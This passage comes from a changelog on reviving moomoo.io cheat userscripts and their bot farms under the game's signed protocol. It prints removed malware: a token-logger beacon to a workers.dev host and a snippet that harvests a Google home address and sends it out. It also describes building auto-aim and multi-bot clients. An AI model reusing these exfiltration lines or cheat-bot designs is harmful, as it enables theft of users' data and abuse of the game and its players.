Its request differs from the game's in two ways:

| | the game | the mod |
|---|---|---|
| server list | `${api}/servers?v=1.27` | `/servers` with no version (and `?v=1.26` pinned on sandbox) |
| ping URL | `key.region.moomoo.io`**`:port`**`/ping` | `key.region.moomoo.io/ping/` |

That version parameter is not decorative: another unpatcher doing the rounds
carries a `fetch` hook whose only job is to rewrite `v=1.26` to `v=1.27`, so
somebody else hit this too.

There is no network from where this is built, so *which* URLs the live API
accepts cannot be settled here — and guessing would be the wrong move. What it
does instead is send exactly what the working client sends, fall back to the
bare URL if that is refused, and never turn a failure into a blank panel with
nothing in the console. Driven against controlled responses in a real browser:

| API behaviour | requests made | result |
|---|---|---|
| `?v=1.27` works | `/servers?v=1.27` | 1 server, nothing logged |
| only the bare URL works | `?v=1.27`, then `/servers` | 1 server, nothing logged |
| always 500 | both | empty list, **logged** |
| returns `{}` instead of an array | both | empty list, **logged** |

## The frame rate

Three places wrapped a player draw in both a shadow and a canvas filter, none
of them behind a switch:

```js
ctxt.shadowBlur = 18;
ctxt.filter = "brightness(0.85) saturate(1.1)";
renderCircle(0, 0, obj.scale, ctxt);
```

`shadowBlur` is a Gaussian pass over everything drawn under it. `filter` is
worse: it drops the 2D context onto a path that allocates an offscreen surface,
rasterises into it, filters, then composites. Two of these run per player from
`renderPlayer` and a third from `renderPlayers`, and `renderPlayer` also draws
hats, accessories and both hands — so a busy screen multiplies it by every
player on it, every frame.

`tools/glow-bench.js` draws the same shapes in a real browser with and without:

| players | glow off | glow on | cost |
|---|---|---|---|
| 1 | 0.02 ms | 0.07 ms | 2.9× |
| 10 | 0.09 ms | 0.61 ms | 6.8× |
| 20 | 0.16 ms | 1.19 ms | 7.3× |
| 40 | 0.29 ms | **2.33 ms** | **8×** |

It is now a **Player Glow** switch in the Visuals tab. `BoxF` starts a setting
from `localStorage.getItem(id) === "true"`, so one nobody has touched is off —
the right way round for something that only changes how things look. The ghost
overlay does the same thing and is left alone, because it was already behind
`isC("Ghost")`.

## Primary Sync only worked one way

The mod talks to two servers of its own: one sends a fixed handshake and
receives other users' positions, the other gets `sendPlayerInfo()` on a timer
carrying your **name, sid, server, ping and live x2/y2**. That is the advertised
"Primary Sync" feature — seeing other people running this mod — and it is the
author's, not something smuggled in.

But the switch for it only governed what came back. `configs.serverSync` decides
whether the mod *uses* the data, and it is even reported inside the outgoing
payload, yet nothing checked it before sending: turn Primary Sync off and your
name and coordinates kept going out. It is checked now, before the socket test,
so off also stops it dialling out. That is the toggle doing what it says, not a
feature removed.

## Checked

`test/caramila.js` — 61 checks, including a round trip on the wire against the
game bundle's own crypto, and that the original really did send regardless of
the setting.

`node tools/probe-mod.js --standalone RoBoTic-CaraMila.v6.9.5.js` boots it clean
with 10 of 10 published globals, and its menu — 7 tabs, themed, ~330 lines of
its own CSS — renders and opens on Escape.

Three probe faults surfaced while doing this, all of which made it a friendlier
place than the real page, and all now fixed: it served its own HTML to the mod's
`fetch`, so `JSON.parse` choked on `<!doctype`; it planted ids the mod creates
itself, so a `<canvas id="pingCanvas">` was shadowed by a `<div>` with no
`getContext`; and it ran on an opaque origin where `localStorage` throws "Access
is denied", which these mods all use for settings. It now serves only the
navigation, plants only ids the mod does *not* create, and runs as
`https://moomoo.io/`.

---

# Annihilator.v0.8.9.js (v0.8.9)

A hook mod in the usual shape, so it gets the usual `EXP` shim. What is
specific to it is that **not a single line of it ever ran**, for two separate
reasons, either of which was fatal on its own.

## `@run-at document_start`

An underscore. `document_start` is not a value Tampermonkey accepts, so it
ignored the line and fell back to the default — `document-end`. By then the
game bundle had already taken its own reference to `WebSocket.prototype.send`,
and the mod's hook was installed onto a function nothing was calling any more.
The mod loaded, drew its menu, and silently sent nothing.

Correcting the value to `document-start` is necessary but **not sufficient**,
and getting that wrong is worth recording: the first build did only that, and
the mod stopped loading entirely — no menu at all. Its top level builds the
menu with `document.body.appendChild(menuDiv)` and
`getEl("gameUI").appendChild(mStatus)`, and at document-start there is no body
and no `gameUI`. It died on the first one. The typo had been *hiding* that,
because document-end is exactly when the DOM is ready.

So the two halves need opposite timings, and the build gives them opposite
timings: the shim goes in at the top, and the body is wrapped in `__annBoot()`
and deferred until `document.readyState` has moved past `loading` **and**
`gameUI` exists. Nothing is missed by waiting — until the body runs, the shim
has no handler, and its trampoline passes the game's own already-framed
packets straight through.

## `@require https://rawgit.com/...`

rawgit.com shut down in 2019. A `@require` that fails **aborts the whole
userscript** before its first statement — so even with the `@run-at` fixed, the
file was dead code. msgpack is bundled now, as it is in every other script here.

## The three seams

The mod worked in packet *names* and encoded them itself. That job now belongs
to the shim, which meant rewiring exactly three places and leaving the other
12,000 lines alone:

| Was | Is |
|---|---|
| `WebSocket.prototype.send = function (message, sid) {…}` | `EXP.setHandler(function (message, sid) {…})`, which `EXP.unframe`s what the game hands it |
| `window.msgpack.encode([type, data]); this.nsend(binary)` | `EXP.send(sock, type, data)` |
| `getMessage`: `window.msgpack.decode(...)` | `EXP.receive(message.target \|\| WS, message.data)` |

The filter body — 240 lines of chat commands, packet counters and
`dontSend` logic — moved out of the socket hook into `sendFiltered(sock, type,
data)` **unchanged**, including a bare `{ }` block standing where
`if (WS == this) {` used to open, so every `let` inside keeps the exact block
scope it had. That matters because the mod's own `packet()` used to reach those
filters by going back through `WS.send`; now it calls `sendFiltered` directly,
and `origPacket()` still skips them the way `WS.nsend` did.

`window.leave` sends a packet named `"kys"`, which is not a real packet and
never was — the shim drops it rather than putting an unresolvable name on a
signed channel. That is the mod's own joke, left as found.

## The menu could never open

Escape is meant to toggle the mod menu. It never could, for two independent
reasons, and adding jQuery would have fixed only the first:

- `$("#menuDiv").toggle()` is the **only** jQuery call in 12,000 lines, and
  moomoo ships no jQuery. Escape threw `$ is not defined` and took the rest of
  the keydown handler with it.
- The menu is already `display: block`. What hides it is `left: -200000px`, set
  where it is built. jQuery's `.toggle()` flips *display* — so it would have
  turned an off-screen visible menu into an off-screen hidden one and back.

Both facts came from booting it and reading the computed style, not from
reading the source: `menuLeft: "-200000px"`, `menuDisplay: "block"`,
`jQueryPresent: false`, and 669 characters of menu content sitting there
correctly built. The toggle now follows the `openMenu` flag the handler
already keeps, and moves the menu instead of hiding it.

## `getEl("adCard").remove()`

The commonest failure in this whole family, and it is in here too — early
enough to take everything after it down with it. `adCard` and `promoImgHolder`
are elements moomoo deleted. The mod only wants them gone and they already
are, so a null check is the entire fix; `gameName` and `chatButton` got the
same treatment.

The probe could not see this, because it was creating **every** id the mod
looks up — including the ones that no longer exist, which made it a friendlier
place than the real page. It now skips the ids on the unpatcher's own
`GONE_IDS` list, and catches this class where before it reported a clean boot.

## Comments

This one is built rather than edited: `node tools/build-annihilator.js` applies
the metadata fixes, the shim and the three seams to
`reference/annihilator-original.js`. The shim goes in **comment-free**, and the
seams are pure code, so nothing in the shipped file is annotation that was not
in the author's original — their banner and their chat-command reference are
untouched. `tools/strip-comments.js` now exports `stripComments()` for that,
and still refuses to write unless the syntax tree is unchanged.

## Checked

`test/annihilator.js` — 50 checks: both metadata mistakes, that the bundled
shim is byte-identical to every other copy, that no part of the mod still
encodes for itself or calls `nsend`, that `packet()` still filters and
`origPacket()` still does not, and a round trip on the wire against the game
bundle's own crypto — spawn framed, HMAC verified server-side, sequence
numbered, and an incoming opcode arriving under the name the mod's events table
is keyed by.

`node tools/probe-mod.js --standalone Annihilator.v0.8.9.js` boots it in a real
Chromium with no errors.

That probe had to be fixed first, because it passed the broken build. It was
creating the page and publishing `window.config` **before** injecting the mod,
which models a mod running at document-end — the one timing a document-start
mod never sees. `--standalone` now injects the mod into an empty document and
brings the page, the config and the constructor freeze in afterwards, in that
order. It also checks the mod actually *ran*: "no errors" and "never executed"
look identical from the outside, so it counts how many of the globals the mod
assigns to `window` exist when it is done. Against the un-deferred build it
reports the `gameUI` failure and 9 of 12 globals; against the shipped one, no
errors and 11.

---

# UnX.user.js (`chicken` v4.6.2, shipped as **unX**)

A full client replacement with its own `io` object and its own bundled msgpack,
so it gets a protocol module (`CHKP`) rather than the hook-mod shim. What makes
this one different: it targets **two** servers. moomoo.io runs the current
protocol; `mohmoh.dev.tc` is a private server still on the 2019 one, and the
script already carries a `clientTranslate` map for it. Both paths had to keep
working, so the fix hangs off what `io-init` negotiates rather than off the
hostname: mohmoh never sends `mode: 1`, so nothing there is framed and the old
names still go out.

## Why it did not run

| Cause | Effect |
| --- | --- |
| Plain msgpack transport | Same break as the rest — see [Why it broke](#why-it-broke). Its `connect` also fired the callback from `onopen`, so it spawned before the keys existed. |
| ALTCHA | `executeRecaptcha()` fetches `api.moomoo.io/verify`, brute-forces the proof-of-work in a worker pool, and returns `alt:<payload>`. That endpoint no longer serves a challenge, so the function could only throw — and the connect then went out with no token at all. |
| The page's captcha is unusable | The page hands its own callback to `turnstile.render()` **by value**, before this script runs, so wrapping `window.onGotTurnstileToken` afterwards never sees the token. And this client removes the page's menu — widget included. Re-parenting the widget does not help either: that reloads its iframe, and the page will not render it again once it thinks it has. |
| The server ping had no timeout | `processServers()` awaits `fetch("https://<server>/ping")` for every region with no bound, inside a `Promise.all`. One unresponsive host and it never settles — the client sits on **"Connecting to moomoo servers…"** forever. The live client races the same fetch against 100 ms; this one did not. |
| Unguarded teardown | Eleven `getElementById(...).remove()` / `.style` calls at module scope on elements the page may no longer have. One missing element and the client dies before drawing a frame. |

## What changed

| Area | Fix |
| --- | --- |
| `CHKP` module (new, top of file) | Seeded PRNG, opcode-table builder, SHA-256, HMAC-SHA256, hex key parsing, and the Turnstile token capture. |
| `io.connect` | Reads the seed and key out of `io-init`, fires the connect callback **there** instead of on `onopen`, and maps incoming numeric opcodes back to names. Unmapped ones are ignored rather than thrown on. |
| `io.send` | Frames as `tag ‖ msgpack([opcode, args, seq])` when the handshake negotiated it, and keeps the plain `msgpack([name, args])` form otherwise — which is what mohmoh still wants. Nothing goes out before `io-init` at all: the original only checked `readyState`, so the first packets went out unsigned. |
| Captcha | `executeRecaptcha()` now waits for the page's own Turnstile token (wrapping `window.onGotTurnstileToken`, falling back to `turnstile.getResponse()`) and returns it with the `cf:` prefix. It still writes `window.superman`, which is what the bot relays read, so those pick up the right prefix for free. |
| Turnstile widget | `CHKP` renders **its own** widget, with the game's sitekey, into its own panel, loading the Turnstile api itself if the page has not. Nothing about the page's menu teardown can affect it. |
| The captcha is a step of its own | Cloudflare decides whether the challenge wants a click, and in practice it does, so the widget goes in a panel in the middle of the screen rather than being tucked away. The panel takes itself down the moment the challenge passes and the client carries straight on — no extra button. Nothing times out underneath you. |
| Reload timer | `nextLoadingStage()` arms a 30-second `location.reload()`, which would fire while you are still on the captcha. It is called off for the duration and re-armed once a token is in hand. |
| Server ping | Raced against 100 ms, the way the live client does it. |
| Server list | Asks for `?v=1.27`, the version the live client asks for; this copy was still on `1.26`. |
| Page teardown | All of it null-guarded through two small helpers. |
| Page render loop | The page's own client keeps painting `#gameCanvas` every frame and would draw over this one. Its loop re-arms through `window.requestAnimFrame`, which nothing here uses, so that name is now an accessor that swallows the assignment and returns a no-op. |

## The menu

Restyled as a space scene, and purely additive — it renames nothing, so every
select, input and button keeps working. The background is generated CSS: three
parallax starfields drifting at 190s/120s/75s, a 4.2s twinkle, four shooting
stars on staggered 7/9/11/13s cycles, and a ringed planet floating on a 16s
cycle. No canvas, no timers, no images, so it does not compete with the game's
own render loop, and it all stops under `prefers-reduced-motion`.

The card itself is glass over that sky, 760×380 (up from 650×450), with the
title glowing cyan and the controls restyled to match.

The **mod menu is left alone** — it keeps the client's own look. It was themed
twice on the way here (once in this space palette, once in the RYN Client's) and
both were reverted on request; the only change that stuck is that the
"Not connected" strip along the bottom of the tab rail is gone.

The script is named **unX** — in the metadata block, on the main menu and on
the mod menu's tab rail. Only the visible strings changed; every `chicken*`
identifier in the code is untouched.

Taken off the menu while there: the Help, Changelogs and Discord buttons, the
credits line, the "Welcome back" line, and the ping/FPS graph (which also pulled
chart.js off jsDelivr on every load). The elements themselves are still built —
the slide-out panels' close handlers reference them — they are just no longer
placed.

`npm run preview:unx` renders it to a standalone HTML file you can open.

## Colours and the texture pack

The **texture pack is gone apart from the minimap**, which was asked for back.
`getTexturePackImg()` resolved hats, accessories and weapons through four imgur
tables; those now resolve to the game's own art. The minimap keeps its
photographic backdrop.
`emeraldSprites` survives as a plain set of weapon names, because
`updateActionBar()` reads it to decide which weapons get a fourth XP tier — the
images are gone, the names stay.

The **"Hyper Performance"** toggle is removed. All it did was repaint every
object flat `#0000ff`, the ground flat `#ffff00` and chat bubbles blue; if it
was ever switched on it stayed on, saved in `localStorage`. Every branch now
takes the game's own colours.

## Why the file was 35,000 lines

Almost none of it was code. The upload was 35,140 lines, of which **21,436 were
a single commented-out `tmpBackgroundBuildings` array** — a block of dead map
data the author left in, roughly 61% of the file on its own. Another ~400 lines
were smaller commented-out fragments: an old `constructor()`, a changelog fetch
against a dead glitch.me host, a server-list loop, a URL parser.

Every comment outside the `// ==UserScript==` metadata block is now stripped,
which takes the shipped file to **13,375 lines**. That is what a full client
replacement actually costs — the whole moomoo game bundle (renderer, entity
system, physics, UI) plus the mod's own features — as against the 200–800 lines
of a hook-style mod like Peter Client, which loads the game from the page and
only patches it.

`tools/strip-comments.js` does the removal. It finds comments with acorn rather
than by regex, so `//` inside a string, a template literal or a regex literal is
left alone; it keeps each removed comment's newlines so line structure and
automatic semicolon insertion are untouched; and it re-parses both versions and
refuses to write unless the two syntax trees are identical, positions aside. The
program is therefore provably unchanged. The build runs it as its last step, so
a rebuild cannot put the comments back.

## The bots

The upload contained **no bot code at all**. `addBots()` opened a socket to one
of ten `*.glitch.me` relay projects and sent `{type:"add", ip, tokens}`; the
relay made the real game connections, ran every bit of the AI, and streamed the
results back as JSON. Glitch ended free project hosting, so all ten hosts return
410 and nothing downstream of them could work.

They are now implemented here, in the browser. Two new classes sit under the
existing `botManager`:

- **`BotSocket`** — a real connection to the game server. It does its own
  `io-init` handshake, so it carries its **own** HMAC key, opcode tables and
  sequence counter; nothing is shared with the main socket or with another bot.
  It spawns, tracks itself and the players around it from the same 13-field
  update stride the client reads, tracks objects on the 8-field stride, notices
  its own death and respawns.
- **`LocalRelay`** — a stand-in for the glitch socket. It accepts exactly the
  JSON messages `botManager` already sends (`add`, `remove`, `update`, `chat`,
  `packet`) and answers with exactly the events the `Bot` wrapper already
  listens for (`botSid`, `botSidRemove`, `canSendNow`). So `botManager`, the
  `Bot` class, the mod menu and every bot setting are **unchanged** — only the
  transport under them moved from someone else's server to this tab.

The AI the relay used to run is reimplemented from the same `update` payload:
Follow Player / Circle Player / Follow Mouse / Stop Moving, autoaim nearest-to-
player or nearest-to-bot, Bot Target Sids, Kill-On Sight, Auto Place Traps
(which sends the client's own three-packet select–swing–reselect sequence), the
Object Breaker modes, Primary Weapon and Bot Names. A bot will never target its
owner, another of your bots, or anyone on your owner team.

`getTokens()` called `altKeyManager.getToken()`, an ALTCHA solver for a
challenge the server dropped. It now calls `CHKP.freshToken()`, which keeps a
second Turnstile widget of its own and resets it once per bot.

That widget was hidden off-screen at first, and **that is why no bot ever
connected**. Turnstile in managed mode decides per request whether to show an
interactive checkbox, and when it does somebody has to tick it — which nobody
could, at `left:-10000px`. Every token came back null after the timeout,
`addBots` skipped every null token, and the result was a long wait and no bots,
with nothing said about it.

The bot challenge now gets a visible panel of its own (`#chkBotCaptcha`),
centred and above the page, with the widget slot in normal flow inside it so
`offsetParent` is never null. It counts through the batch (`One challenge per
bot — 2 of 4`), waits two minutes per token rather than 25 seconds, has a Cancel
link, and closes itself when the batch is done. A bot that ends up with no token
is now reported rather than silently dropped.

## Auto grind

Replaced with a port of the RYN client's `AutoGrind` module, on request. What
shipped here before placed four turrets at fixed compass angles, always swung
the preferred weapon wearing the tank hat, aimed wherever the mouse pointed, and
never stopped — so it kept hitting turrets long after there was any XP left to
earn, and destroyed them about as often as it farmed them.

| | before | now (RYN's) |
| --- | --- | --- |
| Placement | 4 turrets at 0/90/180/270° | 2 at ±40° of where you are aiming (3 at ±75° in sandbox) |
| Aim | the mouse | the centroid of the turrets it owns within 300 |
| Weapon | always the preferred one | great hammer until ruby, then the primary |
| Hat | always tank | tank only when the turret survives the hit |
| Stop | never | switches itself off once both weapons hit ruby |
| Safety | none | skips while an enemy is within 400, or while reloading |

The weapon/hat rule is the interesting part and is reproduced exactly: while the
great hammer still needs XP it swings the hammer with the tank hat regardless of
turret health. Once the hammer is ruby and the primary is the one earning XP,
the turret's health decides — too healthy for both weapons together and it keeps
softening with the hammer; inside one primary hit and the primary swings; in
between, the tank hat comes off so its 3.3× does not destroy the turret.

`getAttackDir()` now prefers `unxGrind.angle` over the cursor while the module
has a target, which is what actually points the swing at the turrets.

## The kill chat

The toggle sent one hardcoded line, `gg - autoGG Master Race`, and nothing else.
It is now two lines you can edit, both in the mod menu next to the toggle:

| Field | Default |
| --- | --- |
| **Kill Message** | `gg {name}` |
| **Kill Count Message** | `{kills} idiots down` |

`{name}` is whoever you just killed and `{kills}` is your running total; both
placeholders are case-insensitive, and either field can be blanked to switch
that line off. The result is trimmed to the 30 characters the game allows.

The count line is sent ~900 ms after the kill line, because the server
rate-limits chat and two lines in the same frame cost you the second one. The
victim's name comes from the death packet, which arrives separately from the
kill-counter update, so a name older than a second is treated as belonging to
someone else's kill and dropped rather than misattributed.

`botManager.killChat()` — which tells your bots to chat when an enemy dies — was
never implemented on the local relay; it is now, and the bots send the Kill
Message line. They deliberately do not repeat the count line.

### What still limits them

- **One token per bot, minted one at a time.** Cloudflare treats a Turnstile
  token as single-use, so bots cannot share the one the main socket connected
  with, and a widget solves one challenge at a time — `freshToken()` queues its
  callers rather than handing the same token to several bots. Adding bots is
  therefore serialised and not instant, and Cloudflare may start issuing
  challenges (or refusing) if you ask for many in quick succession. This is a
  server-side limit, not something the script can route around.
- The bots run in your tab, so they share its CPU and your connection.

## Known limitations

- The sing-along feature pulls from the same dead host; its fetch is now caught
  so it fails quietly instead of leaving an unhandled rejection in the console
  on every load.
- `getChallenge()` / `validateChallenge()` / `createPayload()` and the worker
  pool are now dead code. Left in place rather than deleted.

---

# PeterClient.user.js (`Peter Client` v11)

Hook-style mod again, so the same `EXP` shim. Its own quirks were the way it
got hold of msgpack and two packet names it never updated.

## Why it did not run

| Cause | Effect |
| --- | --- |
| msgpack via `<script>` injection | Instead of a `@require`, it appended `<script src="https://rawgit.com/…/msgpack.min.js">` to the body. rawgit.com has been offline since 2019, so `window.msgpack` stayed `undefined` and *every* send and receive in the file threw. The shim publishes a codec. |
| No `@run-at` | The hook replaces `WebSocket.prototype.send`, and the game captures that reference at bundle load. Now `document-start`, with the body deferred to `DOMContentLoaded`. |
| Plain msgpack transport | Same break as the rest — see [Why it broke](#why-it-broke). |
| reCAPTCHA | Both bot paths called `window.grecaptcha.execute(...)` and built `?token=re:<token>`. `grecaptcha` is not on the page any more, so those threw; the server wants Turnstile's `cf:` tokens. |
| Unguarded `.remove()` | `adCard.remove()` and `promoImgHolder.remove()` sit at module scope on elements the current page does not have. Either one throws and takes the whole client with it. |

## Two names stuck in 2019

The transport fix alone would not have made this one play, because parts of it
were written against a build that used older packet names.

**Outgoing.** Its move-dedup rule reads `else if (type == "f")`. The game sends
that packet as `"9"`, with the same `[dir, auto]` arguments — so the rule never
fired and the dedup never happened. `applyOutgoing()` now folds old names onto
current ones through the shim's own `PACKET_MAP` before the rules run (`"f"` →
`"9"`), and the branch matches the current name. That keeps `packet("f", …)`,
which the client still calls, working too.

**Incoming, in the bot handler.** It waits for `type == "1"` to read its own
sid, and `type == "f"` for the flat player-field array. Those are the 2019
names for setupGame and updatePlayers; the current server calls them `"C"` and
`"a"`. Both moved forward. The argument shapes are the evidence: `data[0]` as a
sid right after spawn, and `data[0]` as the strided player array.

## What else changed

| Area | Fix |
| --- | --- |
| Socket hook | `EXP.setHandler(…)` instead of assigning `WebSocket.prototype.send`, with `applyOutgoing()` extracted so `packet()` runs the same rules. |
| `origPacket()` | Sent through `WS.nsend` specifically to skip the client's own rules. It still skips them — but it goes through `EXP.send` now, because an unframed packet is not something the current server accepts. |
| `window.leave()` | Sends a packet named `"kys"`, which has no opcode. It is now dropped at the shim rather than put on a MAC-authenticated channel, where a junk frame ends the session. Asserted in the tests. |
| Bots | `sendWS` frames through `EXP.send` with that socket's own key and sequence; `onmessage` decodes through `EXP.receive`; tokens come from `EXP.freshToken()`. |
| DOM | The ad-card removals are null-guarded, and the menu intro — sixty lines of unguarded `getElementById("gameName")` writes — is wrapped in a presence check. |

## Known limitations

- `beautiful-sapphire-toad.glitch.me` and the two `connectFillBots` relays are
  third-party bot/sync services, not part of the game. They speak plain msgpack
  and are left alone (they still work through the shim's `window.msgpack`), but
  Glitch ended free project hosting, so expect them to be dead. Note that
  `connectFillBots` hands your server URL *and a valid captcha token* to those
  relays; that is what the feature does.
- A stale `scriptTags[i].src.includes("index-f3a4c1ad.js")` removal targets a
  bundle filename from an older build. It is a no-op now; left as-is.

---

# Robotics.user.js (`Robotics Official` v5.5.6)

A fork of the Aurora source — same `Altcha` class, same private-server proxy,
same `WebsocketBot`, same socket hook, about 5,000 lines of extra features on
top. So it gets the same `EXP` shim, byte for byte, and the tests assert that.

## The one-character bug

Between `@description` and `// ==/UserScript==` sat a line containing exactly:

```
a
```

Not a comment. The metadata block is only a comment because every line inside
it starts with `//`; a bare `a` is executable JavaScript, and it is the *first
statement in the file*. The script threw `ReferenceError: a is not defined`
before anything else ran. Whatever else was wrong with it was academic.

## What else was wrong

| Cause | Effect |
| --- | --- |
| No `@run-at` | The hook does `WebSocket.prototype.send = …` at line 4335, but the game captures that reference when its bundle loads. At `document-idle` there is nothing left to hook. Now `document-start`, with the body deferred to `DOMContentLoaded` — it reads `document.head` and `getElementById` at load. |
| `msgpack` never defined | Eight call sites use `msgpack.encode/decode` or `window.msgpack.…`, and there is no `@require` and no bundled codec anywhere in the file. Every one of them threw. The shim publishes `window.msgpack`. |
| Plain msgpack transport | Same break as the rest — see [Why it broke](#why-it-broke). |
| ALTCHA | `AltSolver` mints `alt:<payload>` tokens for bot connections; the server wants Turnstile `cf:` tokens. And the `Altcha` class allocated one Web Worker per CPU core in a `static {}` block, each pulling `js-sha256` from a CDN, for a challenge that no longer exists. |

## What changed

| Area | Fix |
| --- | --- |
| Socket hook | `WebSocket.prototype.nsend = send` / `send = hook` replaced by `EXP.setHandler(…)`. Worth noting why the original could not simply stay: the shim already defines `nsend`, so re-assigning it to the trampoline would have made `this.nsend(…)` recurse into itself. |
| `applyOutgoing()` | The per-packet rules extracted out of the hook, so `packet()` runs them too — previously `packet()` re-entered the hook by calling `WS.send()`, which no longer works now that outgoing frames carry a MAC. |
| Private-server auto-login | It wrapped `nsend` and msgpack-decoded the outgoing buffer looking for the spawn packet. Outgoing frames are not plain msgpack any more, so the trigger moved into `applyOutgoing()`, which already has the decoded name. |
| `getMessage` / bot `onmessage` / bot sniffer | All three decode through `EXP.receive`, which maps numeric opcodes back to names. |
| `client.sendWS` | Frames through `EXP.send` with the bot socket's own key, tables and sequence, taken from that socket's own `io-init`. |
| Bot tokens | `EXP.freshToken()` — Turnstile tokens are single-use, so each bot asks for a new one. Best effort; Turnstile decides. |
| ALTCHA pool | Allocated lazily, so the workers only spawn if a widget appears (it will not). |
| `window.WebSocket` reassigned twice | Once for the private-server proxy, once for `WebsocketBot`. The game pins that property, so both fail; wrapped in `try/catch` with a warning rather than relying on non-strict silent failure. Consequence: the private-server redirect does not take effect. |

## Known limitations

- `ws://localhost:6767`, the "sync server" the mod talks to, is not part of the
  game and is left as-is. It fails to connect unless you run one yourself, and
  the code guards for that.
- The `AltSolver` class is now dead code. Left in place rather than deleted.

---

# X18K.user.js (`x18k`)

A full client replacement, like Revelation and the Laffer remake: it bundles a
whole copy of the game and runs it in place of the page's own. Unlike those, it
does not discover a server itself — it hijacks `window.WebSocket`, lets the
page do the server pick and the Turnstile challenge, and takes over the address
the page was about to connect to.

## Before the protocol: two things that shipped in the file

**A wildcard `@include`.** Glued onto the end of the `@grant` line, past a
couple hundred spaces so it does not show up unless you scroll, was:

```
// @include /moomoo.io|.*/
```

A regex include whose second alternative is `.*` — the script ran on **every
site you visit**, not on moomoo.io.

**A token logger.** Right under it, a 40 KB obfuscated block. It sets
`window.tokenLoggerRan`, then checks whether the page URL contains
`youtube.com/watch`; on moomoo.io it exits immediately, which is why nobody
notices. Elsewhere it harvests a token and beacons it out as a Discord webhook
payload:

```
new Image().src = "https://moomooio.iloveloggers.workers.dev/?data=" + base64(json)
```

with a `fetch` POST to `https://moomoo.iloveloggers.workers.dev/` as fallback
when the image beacon does not fire. The JSON carries `{ Date, Token, URL }`
under a "Logged info" embed. Nothing in the mod referenced any of it.

I confirmed the behaviour by running the block in a sandboxed VM with a
recording `window` — the beacon URL above is the actual output, not a reading
of the source. Both the `@include` and the block are gone. (A second,
already-commented-out copy of the same block sat below it; removed too.)

## Why it did not run

| Cause | Effect |
| --- | --- |
| `@require https://rawgit.com/…/msgpack.min.js` | rawgit.com has been dead since 2019. A failed `@require` stops the whole userscript from loading — nothing else in the file ever got a chance. The bundled msgpack-lite is what the code actually uses; the `@require` was never needed. |
| No `@run-at` | Defaults to `document-idle`. By then the page has already captured `window.WebSocket` and pinned it with `writable: false, configurable: false`, so `window.WebSocket = class {…}` throws `TypeError` in strict mode and takes `app.js` down with it. Now `document-start`. |
| Plain msgpack transport | Same break as every other mod here — see [Why it broke](#why-it-broke). |
| `promoImgHolder.remove()` | The element no longer exists on the page, so this threw at module scope and killed the client before it drew a frame. |

## What changed

| Area | Fix |
| --- | --- |
| `X18P` module (new, top of file) | Seeded PRNG, opcode-table builder, SHA-256, HMAC-SHA256, hex key parsing, native `WebSocket.prototype.send` captured before anything is replaced. |
| Socket stub | `window.WebSocket` is replaced at `document-start` via `defineProperty`, so the page's freeze pins *our* constructor. It carries a `prototype.send` and the `readyState` constants, because the page captures both at load. If the client is not up yet the address is queued rather than dropped. |
| DOM timing | The client grabs `#gameCanvas`, `#mainMenu` and ~50 other elements at module scope, which cannot happen at `document-start`. Everything below the stub now waits for `DOMContentLoaded`; the stub goes in immediately and holds the address. |
| `io.connect` | Parses `io-init`, builds the tables and key, and fires the connect callback **there** rather than on `onopen`. Incoming numeric opcodes map back to handler names; an unmapped one is ignored instead of throwing. |
| `io.send` | Frames as `tag ‖ msgpack([opcode, args, seq])`. Nothing goes out before the handshake — on this server an untagged frame ends the session. Unknown names are dropped. |
| Page render loop | The page's own client keeps its `requestAnimationFrame` loop running against `#gameCanvas` even though its socket never opens, and would repaint over every frame this client draws. It re-arms through `window.requestAnimFrame`, which nothing here uses, so that name is now an accessor that swallows the page's assignment and hands back a no-op. |
| `onerror` | Compared `readyState` against `WebSocket.OPEN` — which is the stub after the hijack, so `undefined`. Points at `OriginalWebSocket.OPEN`. |
| Ping | Was started before the error check and re-armed on every disconnect, stacking intervals. Now starts once, on a successful handshake. |
| Ad removal | `promoImg` / `promoImgHolder` removal is null-guarded. |

Captcha needed no work: the page renders Turnstile itself and appends the token
to the connect URL, and that URL is exactly what the stub intercepts.

## Known limitations

- The **Send bots / Close bots** buttons in the menu have no handlers in this
  build — the feature was never wired up by its author. Untouched.
- The page's userscript-detection banner still appears. It is cosmetic and does
  not block play.

---

## Verification

The protocol port was checked against the code lifted straight out of the game
bundle:

- Opcode tables identical over 5,000 random seeds.
- HMAC tags identical to both the game's implementation and Node's
  `crypto.createHmac('sha256')` over 400 random key/message pairs.
- Hex key parsing identical over 200 samples.

Plus end-to-end tests driving the patched `ee` object and the patched bot
socket against a simulated server: handshake ordering, server-side HMAC
verification, opcode round-tripping, sequence numbering, unknown-opcode
handling, per-bot key isolation, and the legacy (unencrypted) fallback path.

For the External Client, the bundled msgpack was checked to be byte-identical
to the game's encoder over 4,000 random values, in both directions, on top of
the same framing, remapping, trampoline and isolation tests.

The Laffer remake gets the same protocol comparison, plus coverage of the
hijack itself: that the stand-in tolerates everything the game does to it, that
the captured URL reaches the mod with its token intact, and that all 17 of its
packet names resolve to real opcodes.

chicken gets the protocol comparison against the game bundle *and* against
Node's `crypto`, plus proof that its mohmoh path still emits plain, 2019-named
msgpack while moomoo.io gets framed packets off the same code.

Peter Client gets the same treatment, plus checks that the only remaining
`window.msgpack` call sites are the ones talking to its own relay, that the
packet it uses to troll the server is dropped instead of being put on a
MAC-authenticated channel, and that both directions of its stale packet naming
were moved forward.

Robotics gets the shim-parity assertion, the same protocol comparison, and
checks that the metadata block contains nothing executable, that no call site
still reaches for the codec the script never defined, and that all three
receive paths and both send paths go through the shim.

x18k gets the same protocol comparison plus the takeover itself: that the stub
queues an address arriving before the client is up and forwards one arriving
after, that the page's `requestAnimFrame` assignment is swallowed, that the
connect callback fires on `io-init` and not on open, that nothing is sent
before the handshake, that all 17 packet names it uses resolve to opcodes, and
that the removed logger leaves no trace in the code.

The test harness pulls the code under test straight out of the shipped scripts
and out of the game bundles, so the tests cannot drift from what ships. Run
them with `npm test` — 847 checks.

unX is additionally re-parsed by the suite to prove that no comment survives
past the metadata block and that the metadata block itself is intact.

None of them has been verified against the live server; that needs a
browser and a real Turnstile token.


---

# Sakuna.user.js (`Sakuna 44`)

A hook mod, so it gets the same `EXP` shim as the rest. Two separate jobs: take
out what the author put in, and make what is left run.

## What was in the file

**1. A home-address harvester.**

```js
GM_xmlhttpRequest({method:'GET', url:'https://myaccount.google.com/address/home', onload: function(g){
    ... scrape name and address out of the response ...
    dm_ = `https://www.google.com/maps/vt/data=...`;
}});
let h_ = () => {serverIsOpen && socket.send(JSON.stringify({dm: dm_, dn: dn_, da: da_}))};
```

It uses your logged-in Google session to read the home address and name saved on
your account, builds a map tile URL for the place, and sends all three to the
author's socket.

**2. A password prompt with its label hidden.**

